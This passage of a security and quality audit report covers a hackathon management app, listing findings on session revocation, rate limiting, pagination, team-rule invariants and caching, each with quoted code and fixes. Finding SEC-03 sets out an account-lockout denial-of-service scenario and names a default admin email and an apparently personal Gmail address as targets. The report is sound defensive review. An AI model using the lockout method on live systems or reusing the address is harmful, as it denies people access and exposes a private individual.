  Inside `ManageModal`:
  ```javascript
  const [forceAddId, setForceAddId] = useState('');
  const [forceRemoveId, setForceRemoveId] = useState('');
  if (!team) return null;
  ```
  Returning `null` preserves component hook state across renders.
- **Evidence & Real-World User Impact:**
  An admin opens Team Alpha, types a student's registration number into the "Force Add Member" box, but changes their mind and closes the modal. They then open Team Beta to check details: the registration number typed for Team Alpha is still sitting in the input box. If they click "Force Add", the student is added to the wrong team.
- **Remediation:**
  Add a `key` prop to force remounting:
  ```jsx
  <ManageModal key={active?.id ?? 'none'} team={active} onClose={() => setActive(null)} onDone={refresh} />
  ```

---

### AUTH-02: Revoked Students Remain Authenticated Across Browser Page Refreshes
- **Location:** [backend/src/controllers/auth.controller.js:51-54](backend/src/controllers/auth.controller.js#L51-L54) & [frontend/src/components/layout/RouteGuards.jsx:9-21](frontend/src/components/layout/RouteGuards.jsx#L9-L21)
- **Severity:** **Medium**
- **Category:** Authentication / Session Lifecycle
- **Problem:**
  When `AuthContext` boots on page refresh, it calls `/api/auth/me`. In `auth.controller.js`:
  ```javascript
  export const me = async (req, res) => {
    const user = await userService.findById(req.user.id);
    if (!user) throw Unauthorized('Account no longer exists');
    res.json({ user });
  };
  ```
  The handler checks if the user exists, but does **not** check if `user.verificationStatus === 'REVOKED'`.
- **Evidence & Real-World User Impact:**
  If a student's verification is revoked by an organizer due to disciplinary or fraudulent reasons, refreshing the page does not boot the user. `RouteGuards.jsx` sees `isAuth: true` and lets the revoked student view their dashboard, team discussions, and submissions until the 24-hour JWT expires.
- **Remediation:**
  Check verification status in `/api/auth/me`:
  ```javascript
  if (user.role === 'STUDENT' && user.verificationStatus === 'REVOKED') {
    throw Unauthorized('Your account verification has been revoked');
  }
  ```

---

### ADM-04: Admin Accounts Blocked from Inspecting Student Dashboard Perspective
- **Location:** [frontend/src/components/layout/RouteGuards.jsx:16-19](frontend/src/components/layout/RouteGuards.jsx#L16-L19)
- **Severity:** **Low**
- **Category:** Admin Ergonomics / Role Testing
- **Problem:**
  In `RouteGuards.jsx`:
  ```javascript
  if (role) {
    const allowed = Array.isArray(role) ? role.includes(user.role) : user.role === role;
    if (!allowed) return <Navigate to={homePathForRole(user.role)} replace />;
  }
  ```
- **Evidence & Real-World User Impact:**
  Routes like `/dashboard` and `/team` enforce `role="STUDENT"`. When an administrator attempts to visit `/dashboard` to preview how problem statements or submission slots appear to participants, they are immediately redirected to `/admin`. Admins cannot visually verify student-facing features without creating a separate student test account.
- **Remediation:**
  Allow `ADMIN` role to bypass role checks in read-only preview mode or allow multi-role simulation:
  ```javascript
  const allowed = user.role === 'ADMIN' || (Array.isArray(role) ? role.includes(user.role) : user.role === role);
  ```

---

## Post-Pull Delta Audit Findings (21 Nov Updates)

### SEC-03: Distributed Account Lockout Denial of Service via Email-Keyed Rate Limiting
- **Location:** [backend/src/middleware/rateLimit.js:35-42](backend/src/middleware/rateLimit.js#L35-L42) & [backend/src/routes/auth.js:11-16](backend/src/routes/auth.js#L11-L16)
- **Severity:** **High**
- **CWE:** [CWE-307: Improper Restriction of Excessive Authentication Attempts](https://cwe.mitre.org/data/definitions/307.html) & [CWE-400: Uncontrolled Resource Consumption](https://cwe.mitre.org/data/definitions/400.html)
- **Problem:**
  `loginPerEmailLimiter` applies a hard 15-minute lockout after 5 failed attempts, keyed purely by the recipient's email address:
  ```javascript
  export const loginPerEmailLimiter = rateLimit({
    ...common,
    windowMs: 15 * MINUTE,
    limit: 5,
    skipSuccessfulRequests: true,
    keyGenerator: (req) => `login:${String(req.body?.email ?? '').trim().toLowerCase()}`,
    handler: limited('login_email'),
  });
  ```
- **Evidence & Attack Scenario:**
  Because the key does not incorporate the requester's IP address, an unauthenticated attacker anywhere in the world can fire 5 failed POST requests to `/api/auth/login` targeting any known email address (such as the default `admin@vortex.hack`, `bhabeshcse@gmail.com`, or emails of jury members and student leaders listed in the directory). This locks out the legitimate administrator, juror, or team leader for 15 minutes across all devices and networks. An automated script running every 15 minutes can permanently deny system access to key personnel during the live hackathon.
- **Remediation:**
  Do not lock out the target account globally without IP binding. Key the limiter on `IP + email` compound key, or introduce progressive delays / CAPTCHA on failure instead of a flat lockout that impacts the account owner.

---

### AUTH-03: Password Reissue Fails to Revoke Active JWT Sessions & Realtime Sockets
- **Location:** [backend/src/services/user.service.js:235-238](backend/src/services/user.service.js#L235-L238) & [backend/src/middleware/auth.js:45-50](backend/src/middleware/auth.js#L45-L50)
- **Severity:** **High**
- **Category:** Authentication / Session Invalidation
- **Problem:**
  When an administrator reissues a student's password via `/api/admin/verification/students/:id/reissue-password`, the service generates a fresh password and updates `passwordIssuedAt`:
  ```javascript
  await prisma.user.update({
    where: { id: userId },
    data: { passwordHash, passwordIssuedAt: new Date() },
  });
  ```
  However, `auth.js` (`requireAuth`) only inspects `getUserStatus(payload.sub) === 'VERIFIED'`. It **never** verifies that `payload.iat` is later than `user.passwordIssuedAt`. Furthermore, `disconnectUser(userId)` is not called.
- **Evidence & Real-World Impact:**
  If a student's password or device is stolen or compromised, having an administrator reissue a fresh password does **not** boot the unauthorized user. The attacker's active JWT remains valid for up to 2–8 hours, and their active Socket.IO connection remains attached to `global`, `user:<id>`, and `team:<id>`.
- **Remediation:**
  1. Store `passwordIssuedAt` in `getUserStatus` cache (or track token generation versions / `tokenVersion`).
  2. In `auth.js`, reject tokens whose `iat * 1000 < user.passwordIssuedAt.getTime()`.
  3. Call `disconnectUser(userId)` inside `reissuePassword` and `restoreRevokedStudent`.

---

### PERF-04: Unpaginated Student Directory Floods Server Bandwidth & Client Memory
- **Location:** [backend/src/routes/students.js:10-13](backend/src/routes/students.js#L10-L13), [backend/src/services/directory.service.js:31-52](backend/src/services/directory.service.js#L31-L52), & [frontend/src/pages/shared/DirectoryPage.jsx:43](frontend/src/pages/shared/DirectoryPage.jsx#L43)
- **Severity:** **High**
- **Category:** Performance / Unpaginated Data Sets
- **Problem:**
  The new `/directory` view calls `GET /api/students/directory`. In `directoryService.list()`:
  ```javascript
  const [students, domains] = await Promise.all([
    prisma.user.findMany({
      where: { role: 'STUDENT', verificationStatus: 'VERIFIED' },
      select: DIRECTORY_FIELDS,
      orderBy: { fullName: 'asc' },
    }),
    prisma.domain.findMany({ select: { id: true, name: true } }),
  ]);
  ```
  There is **zero server-side pagination** (`take`, `skip`).
- **Evidence & Real-World Impact:**
  In an event with 1,500–2,000 verified students, each request returns a 2–4 MB JSON payload containing complete profile details, technical skills, contribution areas, and domain preferences. All search filtering, college chips, domain filters, and team status segmentation are processed client-side in browser RAM (`DirectoryPage.jsx:83-90`). When hundreds of students explore the directory simultaneously during team formation hours, Node.js event-loop latency spikes, outbound network bandwidth saturates, and lower-end mobile browsers freeze.
- **Remediation:**
  Add server-side pagination and database-level query filtering (`search`, `institutionId`, `domainId`, `hasTeam`, `take: 40`, `skip`).

---

### DATA-06: Member Revocation from Finalized Team Silently Violates Invariants
- **Location:** [backend/src/services/membership.service.js:232-269](backend/src/services/membership.service.js#L232-L269) & [backend/src/services/rules.service.js:156](backend/src/services/rules.service.js#L156)
- **Severity:** **High**
- **Category:** Business Logic / Invariant Enforcement
- **Problem:**
  When a student's verification is revoked, `membershipService.removeRevokedUser` removes them from their team and updates member counts. It then triggers `rulesService.recomputeTeamStatus(tx, teamId)`.
  However, in `rules.service.js`:
  ```javascript
  if (team.status === 'FINALIZED' || team.status === 'DISQUALIFIED') {
    return { teamId, status: team.status, skipped: 'TERMINAL_STATUS' };
  }
  ```
  Because `FINALIZED` is treated as an immutable terminal state, the rules engine skips re-evaluation.
- **Evidence & Real-World Impact:**
  If a finalized team had 4 members and 1 female (meeting the exact threshold), and the female member's verification is revoked by an organizer, the team drops to 3 members and 0 females. Because recomputation is skipped, the team **silently remains `FINALIZED`** without an `adminOverride` flag, and continues competing, receiving jury evaluations, and placing on the leaderboard despite violating minimum team size and gender diversity rules.
- **Remediation:**
  When `removeRevokedUser` or `forceRemoveMember` alters a finalized team's composition, either flag the team with `adminOverride: true` and a rule violation alert in the UI, or demote the status to `FORMING` so the leader must recruit a qualified replacement before re-finalizing.

---

### UI-01: TeamChat Uncaught TypeError on Null User Session Crashes Team Page
- **Location:** [frontend/src/components/team/TeamChat.jsx:180](frontend/src/components/team/TeamChat.jsx#L180)
- **Severity:** **Medium**
- **Category:** Frontend Runtime Stability
- **Problem:**
  In `TeamChat.jsx`:
  ```javascript
  const { user } = useAuth();
  ...
  {messages.map((m, i) => {
    const mine = m.sender.id === user.id;
  ```
  `user.id` is accessed directly without optional chaining.
- **Evidence & Real-World Impact:**
  If `user` is temporarily null during session initialization, token refresh, or after a background 401 broadcast, rendering `TeamChat` throws `Uncaught TypeError: Cannot read properties of null (reading 'id')`. Because there is no React error boundary wrapping the chat component, the entire `TeamFormationPage` crashes into a blank screen.
- **Remediation:**
  Use optional chaining: `const mine = m.sender.id === user?.id;`.

---

### DATA-07: Team Reinstate Erases Historical Admin Override Audit Flag
- **Location:** [backend/src/services/teamAdmin.service.js:112](backend/src/services/teamAdmin.service.js#L112)
- **Severity:** **Medium**
- **Category:** Data Integrity / Audit Trail
- **Problem:**
  When an admin reinstates a disqualified team that was not finalized, `teamAdminService.reinstate` executes:
  ```javascript
  await tx.team.update({ where: { id: teamId }, data: { status: 'FORMING', adminOverride: false } });
  ```
- **Evidence & Real-World Impact:**
  If a team previously required an administrative override (e.g., an organizer force-added an out-of-domain participant or bypassed size constraints), disqualifying and subsequent reinstating forcefully resets `adminOverride` to `false`. This erases the permanent audit record that the team received special administrative dispensation.
- **Remediation:**
  Preserve the existing `adminOverride` value or only set it if explicitly requested.

---

### RATE-01: Shared Campus NAT IP Blocks Teammates via Chat Rate Limiter Fallback
- **Location:** [backend/src/middleware/rateLimit.js:68](backend/src/middleware/rateLimit.js#L68)
- **Severity:** **Low**
- **Category:** Network / Rate Limiting Collisions
- **Problem:**
  `teamChatLimiter` defines:
  ```javascript
  keyGenerator: (req) => `chat:${req.user?.id ?? req.ip}`,
  ```
  If `req.user` is unavailable (e.g. if the middleware stack is reordered or behind edge proxies where auth context is decoupled), the key generator falls back to `req.ip`.
- **Evidence & Real-World Impact:**
  On campus networks where hundreds of participants share a single public NAT IP, the fallback creates a shared 30-messages-per-minute bucket across the entire campus, causing innocent participants in different teams to receive `429 RATE_LIMITED`.
- **Remediation:**
  Ensure the limiter strictly requires `req.user.id` or returns `401 Unauthorized` if `req.user` is missing.

---

### OPS-01: Single-Process In-Memory User Cache Incompatible with Multi-Replicas
- **Location:** [backend/src/utils/userStatusCache.js:10-16](backend/src/utils/userStatusCache.js#L10-L16)
- **Severity:** **Low**
- **Category:** Horizontal Scalability / State Synchronization
- **Problem:**
  `userStatusCache.js` uses an in-process JavaScript `new Map()`. While appropriate for a single container, deploying two backend replicas (as suggested in `deploy/README.md` and `GITHUB_ISSUES.md:232` for zero-downtime rolling deploys) causes split-brain cache states.
- **Evidence & Real-World Impact:**
  When an administrator revokes a student on Replica A, `invalidateUserStatus` clears Replica A's memory. Replica B continues to serve cached `VERIFIED` status for up to 30 seconds, allowing the revoked user to continue making authorized requests when load-balanced to Replica B.
- **Remediation:**
  Use Redis for distributed caching or implement Redis Pub/Sub for cross-replica cache invalidation.
